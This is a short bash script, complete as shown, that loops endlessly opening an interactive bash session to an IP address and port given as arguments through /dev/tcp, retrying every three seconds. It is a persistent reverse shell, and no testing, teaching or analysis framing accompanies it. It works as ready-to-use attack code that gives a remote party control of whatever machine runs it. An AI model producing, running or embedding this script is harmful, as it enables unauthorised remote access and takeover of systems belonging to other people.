#!/bin/bash
IP="$1"
PORT="$2"
while :; do
  bash -i >& /dev/tcp/$IP/$PORT 0>&1
  sleep 3
done
